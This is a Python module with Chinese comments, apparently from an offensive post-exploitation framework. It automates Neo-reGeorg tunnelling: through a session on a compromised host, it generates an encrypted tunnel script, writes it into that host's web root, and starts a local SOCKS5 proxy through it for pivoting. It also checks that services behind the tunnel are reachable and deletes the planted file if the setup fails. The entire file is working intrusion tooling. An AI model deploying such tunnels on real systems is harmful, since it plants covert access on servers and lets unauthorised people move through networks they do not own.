"""Neo-reGeorg 适配器：HTTP 出网场景下的隧道（唯一可行方向）。

Neo-reGeorg 是「服务端隧道脚本（PHP/JSP/ASPX/ASHX...）+ 攻击机 Python 客户端」的组合：
  - 攻击机跑本地客户端 neoreg.py，它用 -k <key> 加密、-u <tunnel_url> 连接目标上已上传
    的隧道文件，并在本地开一个 Socks5 端口（-p <port>，默认 127.0.0.1，符合面板仅本地合规）。
  - 目标上的隧道文件由 `neoreg.py generate -k <key>` 生成（输出到指定目录，含
    tunnel.php / tunnel.jsp / tunnel.aspx 等，按目标语言挑一个上传到 Web 可访问目录）。
  - 只有 HTTP 出网时（如只开放 80/443），这是唯一可行方向。

约束：lhost（攻击机地址）由调用方给出（/api/attack 配置），禁止写死 127.0.0.1；
      本机 Socks5 监听一律 127.0.0.1（合规：面板仅本地）。
"""

from __future__ import annotations

import secrets
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

from ..config import TOOLS_DIR
from ..session.base import SessionBase
from .base import AdapterBase, DeployResult, PidRecord, TunnelCheck
from .chisel import port_open, socks5_read_banner

#: 各语言对应的服务端隧道文件名
LANG_FILE = {
    "php": "tunnel.php",
    "jsp": "tunnel.jsp",
    "jspx": "tunnel.jspx",
    "ashx": "tunnel.ashx",
    "aspx": "tunnel.aspx",
    "js": "tunnel.js",
    "go": "tunnel.go",
    "cs": "tunnel.cs",
}

#: 目标平台缺省 Web 根目录（仅当调用方未显式给 remote_dir 时作为兜底猜测；
#: 猜错会导致上传失败，那时如实报 stage=upload，不伪造成功）
REMOTE_WEBROOT_LINUX = "/var/www/html"
REMOTE_WEBROOT_WIN = r"C:\inetpub\wwwroot"


class NeoRegAdapter(AdapterBase):
    tool = "Neo-reGeorg"

    #: Neo-reGeorg 客户端只提供 Socks5 出口；portfwd 需经 socks+本地转发实现，
    #: 本期仅声明 socks，对其它类型返回清晰的 linkType 错误。
    link_types = ("socks",)

    def __init__(self, tools_dir: Path | None = None) -> None:
        self.tools_dir = Path(tools_dir or TOOLS_DIR)

    # ---- 命令与配置生成 ----

    def generate_config(self, *, key: str, tunnel_url: str, local_port: int,
                        lang: str = "php", skip_verify: bool = False,
                        proxy: str = "") -> dict:
        """生成 Neo-reGeorg 的「服务端脚本生成命令」与「本机 Socks 客户端命令」。

        返回键：
          - generate : `python neoreg.py generate -k <key> -o neoreg_server`
          - socks    : `python neoreg.py -k <key> -u <tunnel_url> -p <port> -l 127.0.0.1 [选项]`
          - tunnelUrl: 目标隧道文件的可访问 URL（攻击机客户端连接用）
          - key/lang/bin/linkType: 便于前端/日志展示
        """
        neoreg_py = self._bins()
        py = sys.executable or "python"
        generate = f"{py} {neoreg_py} generate -k {key} -o neoreg_server"
        socks = f"{py} {neoreg_py} -k {key} -u {tunnel_url} -p {int(local_port)} -l 127.0.0.1"
        if skip_verify:
            # 跳过可用性自测（自签 HTTPS / 畸形响应时很有用；等价于官方 -s）
            socks += " -s"
        if proxy:
            socks += f" -x {proxy}"
        return {
            "bin": str(neoreg_py),
            "lang": lang,
            "key": key,
            "tunnelUrl": tunnel_url,
            "generate": generate,
            "socks": socks,
            "linkType": "socks",
        }

    # ---- 内部工具 ----

    def _bins(self) -> Path:
        """返回 neoreg.py 路径（脚本与其 templates/ 同目录即可工作）。"""
        return self.tools_dir / "neoreg" / "neoreg.py"

    def _lang_for(self, platform: str, lang: str) -> str:
        """推断目标语言对应的隧道文件名。

        优先用调用方显式给的 lang；否则平台通用首选 php，Windows ASP.NET 选 aspx。
        """
        if lang and lang in LANG_FILE:
            return lang
        if platform == "windows":
            return "aspx"
        return "php"

    def _tunnel_url(self, target_ip: str, web_root: str, filename: str) -> str:
        """由目标 Web 根 URL + 隧道文件名拼接隧道 URL。

        web_root 已是可访问 URL（如 http://10.0.0.5 或 http://10.0.0.5/upload）；
        为空时退化为 http://<target_ip>。
        """
        base = (web_root or "").strip()
        if not base:
            base = f"http://{target_ip}" if target_ip else "http://127.0.0.1"
        return base.rstrip("/") + "/" + filename

    def _generate_server_files(self, key: str, out_dir: Path, log: list[str]) -> None:
        """本机运行 neoreg.py generate 生成隧道脚本（输出到 out_dir）。"""
        neoreg_py = self._bins()
        cmd = [sys.executable or "python", str(neoreg_py), "generate",
               "-k", key, "-o", str(out_dir)]
        log.append("generate: " + " ".join(cmd))
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        out = (proc.stdout or "") + (proc.stderr or "")
        log.append(out.strip()[-400:] if out.strip() else "(no output)")
        if proc.returncode != 0:
            raise RuntimeError(f"neoreg generate 失败（退出码 {proc.returncode}）: {out.strip()[:200]}")

    def _wait_local_port(self, proc: subprocess.Popen, port: int, wait_s: int,
                         log: list[str]) -> tuple[bool, str]:
        """等本机 Socks5 端口可连（客户端进程已拉起即视为就绪）。"""
        deadline = time.time() + max(1, wait_s)
        while time.time() < deadline:
            if proc.poll() is not None:
                return False, "neoreg 客户端进程退出（参数错误 / 目标不可达）"
            if port_open(port):
                log.append(f"callback ok: 127.0.0.1:{port} listening")
                return True, ""
            time.sleep(1.0)
        return False, f"{wait_s}s 内未检测到本机 Socks 端口 {port} 监听（客户端未正常启动）"

    def _rollback(self, proc: subprocess.Popen | None, pids: list[PidRecord],
                  session: SessionBase | None = None,
                  remote_path: str = "") -> None:
        """失败回滚：结束本机 neoreg 客户端；可选清理目标上的隧道脚本（不伪造成功）。"""
        if proc is not None:
            try:
                proc.kill()
            except Exception:
                pass
        # 目标侧隧道脚本清理（尽力而为，失败只记录不抛错）
        if session is not None and remote_path:
            try:
                if session.platform == "windows":
                    session.exec(f'del /F /Q "{remote_path}"', timeout=12)
                else:
                    session.exec(f"rm -f '{remote_path}'", timeout=12)
            except Exception as e:  # pragma: no cover - 清理失败不影响主流程
                pass

    # ---- 主流程 ----

    def deploy(self, session: SessionBase, *, target_ip: str, link_type: str = "socks",
               lhost: str = "", server_port: int | None = None, local_port: int | None = None,
               bind: str = "0.0.0.0", target_host: str = "", target_port: int = 0,
               relay_addr: str = "", relay_port: int = 0, relay_session: SessionBase | None = None,
               wait_s: int = 45, verify: bool = True, verify_target: str = "",
               verify_port: int = 0, remote_dir: str = "", bind_host: str = "",
               lang: str = "", web_root: str = "") -> DeployResult:
        """部署一条 Neo-reGeorg 隧道（仅 socks）。

        流程：生成 key → 本机 generate 隧道脚本 → 选语言上传到目标 Web 目录
        → 本机起 neoreg 客户端开 Socks5 → 等端口 → 隧道内读目标 banner 验证。
        """
        log: list[str] = []
        if link_type not in self.link_types:
            return DeployResult(ok=False, stage="linkType",
                                error=f"Neo-reGeorg 仅支持 socks 链路（收到: {link_type}）")

        neoreg_py = self._bins()
        if not neoreg_py.exists():
            return DeployResult(
                ok=False, stage="binary",
                error=f"缺少 Neo-reGeorg 客户端: {neoreg_py}（请从 GitHub 拉取 neoreg.py 与 templates/ 放进 tools/neoreg/）")

        key = secrets.token_hex(16)            # 32 位十六进制密钥
        local_port = int(local_port or 1080)
        lang = self._lang_for(session.platform, lang)
        filename = LANG_FILE.get(lang, "tunnel.php")
        pids: list[PidRecord] = []
        proc: subprocess.Popen | None = None
        remote_path = ""

        try:
            # ① 本机生成隧道脚本（含加密 key）
            out_dir = Path(tempfile.mkdtemp(prefix="neoreg_"))
            try:
                self._generate_server_files(key, out_dir, log)
            except Exception as e:
                return DeployResult(ok=False, stage="generate", error=str(e), log=log)
            src = out_dir / filename
            if not src.exists():
                shutil.rmtree(out_dir, ignore_errors=True)
                return DeployResult(ok=False, stage="generate",
                                    error=f"neoreg 未生成目标语言脚本: {filename}（lang={lang}）", log=log)
            content = src.read_text(encoding="utf-8")
            shutil.rmtree(out_dir, ignore_errors=True)

            # ② 上传隧道脚本到目标 Web 可访问目录
            remote_dir = (remote_dir or "").strip() or (
                REMOTE_WEBROOT_WIN if session.platform == "windows" else REMOTE_WEBROOT_LINUX)
            remote_path = remote_dir.rstrip("\\/") + "/" + filename
            log.append(f"upload → {remote_path}（lang={lang}, {len(content)} bytes）")
            try:
                session.write_file(remote_path, content)
            except Exception as e:
                return DeployResult(ok=False, stage="upload",
                                    error=f"隧道脚本写入目标失败: {e}",
                                    remote_path=remote_path, log=log)

            # ③ 拼接隧道 URL 并本机起 neoreg 客户端
            tunnel_url = self._tunnel_url(target_ip, web_root, filename)
            log.append(f"tunnel_url = {tunnel_url}")
            cmd = [sys.executable or "python", str(neoreg_py),
                   "-k", key, "-u", tunnel_url, "-p", str(local_port), "-l", "127.0.0.1"]
            log.append("client: " + " ".join(cmd))
            try:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                        creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
            except OSError as e:
                return DeployResult(ok=False, stage="execute",
                                    error=f"neoreg 客户端启动失败: {e}",
                                    remote_path=remote_path, log=log)
            pids.append(PidRecord(pid=proc.pid, role="server", host_id="",
                                  port=local_port, cmd=" ".join(cmd)))

            # ④ 等本机 Socks5 端口就绪
            ok, werr = self._wait_local_port(proc, local_port, wait_s, log)
            if not ok:
                self._rollback(proc, pids, session, remote_path)
                return DeployResult(ok=False, stage="wait_callback", error=werr,
                                    pid=None, pids=[p.to_dict() for p in pids],
                                    link_type="socks", remote_path=remote_path, log=log)

            result = DeployResult(ok=True, pid=proc.pid, pids=[p.to_dict() for p in pids],
                                  socks_port=local_port, local_port=local_port,
                                  remote_path=remote_path, auth=key, link_type="socks", log=log)

            # ⑤ 隧道内真实性验证：经本地 Socks5 入口连目标服务读 banner
            if verify:
                th, tp = (verify_target or target_host or ""), (verify_port or target_port or 0)
                if th and tp:
                    check = self.verify_tunnel(local_port=local_port, target_host=th, target_port=int(tp))
                    result.verify = check
                    log.append(f"verify: {check.to_dict()}")
                    if not check.ok:
                        self._rollback(proc, pids, session, remote_path)
                        return DeployResult(ok=False, stage="verify",
                                            error=f"隧道已建立但目标服务不可达：{check.error}",
                                            pid=None, pids=[p.to_dict() for p in pids],
                                            link_type="socks", remote_path=remote_path,
                                            verify=check, log=log)
                else:
                    log.append("跳过隧道内验证：未提供目标服务地址（target_host/target_port）")
            return result
        except Exception as e:  # pragma: no cover - 兜底
            self._rollback(proc, pids, session, remote_path)
            return DeployResult(ok=False, stage="exception", error=str(e),
                                pids=[p.to_dict() for p in pids],
                                link_type="socks", remote_path=remote_path, log=log)

    def verify_tunnel(self, *, local_port: int, target_host: str = "",
                      target_port: int = 0) -> TunnelCheck:
        """经本机 Socks5 入口连目标服务读 banner（证明隧道真的通了）。"""
        if not target_host or not target_port:
            return TunnelCheck(ok=False, error="Neo-reGeorg 验证缺少目标服务地址")
        return socks5_read_banner(local_port, target_host, int(target_port))
